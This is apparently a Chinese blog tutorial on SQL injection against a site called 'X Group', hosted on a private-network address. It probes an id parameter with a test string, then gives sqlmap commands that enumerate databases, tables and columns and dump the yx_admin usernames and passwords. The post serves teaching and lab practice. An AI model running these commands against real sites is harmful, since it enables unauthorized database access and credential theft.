---
title: sql实例(X集团)
date: 2022-03-28
cover: https://s1.ax1x.com/2022/03/28/qrv4DU.jpg
tags:
 - sql
categories:
 - sql注入
---

## sql注入（X集团实例）

第一步：进入网站寻找到拥有id=（任意数字）末尾的url，使用sql注入语句进行测试。
<img src="https://s1.ax1x.com/2022/03/28/qrbhuQ.png">
`'1 and 1=1`

第二步：使用sqlmap工具开始进行注入测试，扫出所有数据。

`sqlmap -u "http://192.168.110.66/sql/index.php?r=default/news/content&id=12" --batch -dbs`

<img src="https://s1.ax1x.com/2022/03/28/qrjEWt.png">
<img src="https://s1.ax1x.com/2022/03/28/qrOk0H.png">

第三步：通过sqlmap扫出当前所处数据库。

`sqlmap -u "http://192.168.110.66/sql/index.php?r=default/news/content&id=12" --batch --current-db`

<img src="https://s1.ax1x.com/2022/03/28/qrjEWt.md.png">
<img src="https://s1.ax1x.com/2022/03/28/qrOFne.png">

第四步：使用sqlmap工具扫出所使用的表。

`sqlmap -u "http://192.168.110.66/sql/index.php?r=default/news/content&id=12" --batch -D yanshi --tables`

<img src="https://s1.ax1x.com/2022/03/28/qrb4Bj.png">
<img src="https://s1.ax1x.com/2022/03/28/qrb740.png">

第五步：通过上图可以发现yx_admin的一个数据表，我们可以尝试注入查看内容，通过sqlmap扫出该表中拥有的列。

`sqlmap -u "http://192.168.110.66/sql/index.php?r=default/news/content&id=12" --batch -D yanshi -T yx_admin -columns`

<img src="https://s1.ax1x.com/2022/03/28/qrb5Hs.png">
<img src="https://s1.ax1x.com/2022/03/28/qrboEn.png">

第六步：可以发现该表中拥有username和password两列，所以使用--dump查看这两列。

`sqlmap -u "http://192.168.110.66/sql/index.php?r=default/news/content&id=12" --batch -D yanshi -T yx_admin -C username,password --dump`

<img src="https://s1.ax1x.com/2022/03/28/qrbTNq.png">

注入成功，得到用户名和密码。
<img src="https://s1.ax1x.com/2022/03/28/qrbbCV.png">